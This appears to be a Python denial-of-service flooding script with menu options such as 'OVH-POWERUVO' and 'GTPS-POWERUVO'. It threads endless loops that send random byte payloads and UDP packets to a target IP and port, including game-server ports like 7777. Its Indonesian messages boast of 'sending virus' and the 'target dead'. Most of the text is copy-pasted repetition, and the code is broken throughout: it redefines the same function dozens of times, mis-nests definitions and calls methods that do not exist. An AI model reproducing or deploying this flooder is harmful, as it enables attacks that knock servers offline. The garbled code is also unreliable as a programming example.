                    socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM) # Internet and UDP
                
                msg = Pacotes[random.randrange(0,3)]
                msg = Pacotes[random.randrange(0,3)]
                msg = Pacotes[random.randrange(0,3)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(100):                                    
            mythread = MyThread()  
            mythread.start()                             
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')

for Lbytes in range(threads):
	if choice == 'TCP-POWERUVO'
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    
    def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")
      
def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes)
        s.send(K_bytes)
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes)
        s.send(K_bytes)
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes)
        s.send(K_bytes)
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

class MyThread(threading.Thread):
     def Lbytes(self):
         while True:
                sock = Lbytes.socket(
                    socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM) # Internet and UDP
                
                msg = Pacotes[random.randrange(0,3)]
                msg = Pacotes[random.randrange(0,3)]
                msg = Pacotes[random.randrange(0,3)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(100):                                    
            mythread = MyThread()  
            mythread.start()                             
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')

for Lbytes in range(threads):
	if choice == 'OVH-POWERUVO'
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
 
 def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")
      
def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes)
        s.send(K_bytes)
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes)
        s.send(K_bytes)
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes)
        s.send(K_bytes)
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

class MyThread(threading.Thread):
     def Lbytes(self):
         while True:
                sock = Lbytes.socket(
                    socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM) # Internet and UDP
                
                msg = Pacotes[random.randrange(0,3)]
                msg = Pacotes[random.randrange(0,3)]
                msg = Pacotes[random.randrange(0,3)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(100):                                    
            mythread = MyThread()  
            mythread.start()                             
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')

for Lbytes in range(threads):
	if choice == 'GTPS-POWERUVO'
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
 
 def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")
      
def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
